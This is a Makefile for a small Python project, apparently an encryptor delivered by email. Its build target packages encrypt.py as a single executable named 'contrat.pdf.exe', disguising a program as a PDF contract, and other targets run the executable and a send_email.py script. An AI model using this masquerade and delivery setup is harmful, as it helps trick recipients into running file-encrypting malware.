# variables

PYTHON = poetry run python
POETRY = poetry
ENCRYPT = encrypt.py
DECRYPT = decrypt.py
MAIN = main.py

# files are run even if it doesn't exist
.PHONY: install encrypt decrypt clean build run email main

# Install dependencies via Poetry
install:
	$(POETRY) install

# Run the encrypt file
encrypt:
	$(PYTHON) $(ENCRYPT)

# Run decrypt file
decrypt:
	$(PYTHON) $(DECRYPT)

# Clean files generated (dist, build)
clean:
	rm -rf dist build *.spec

# Bulid executable file with pyinstaller via poetry
build:
	$(POETRY) run pyinstaller --onefile --name "contrat.pdf.exe" encrypt.py

# Run the file
run:
	./dist/contrat.pdf.exe

# Send mail with script send_email.py
email:
	$(PYTHON) send_email.py

main:
	$(PYTHON) $(MAIN)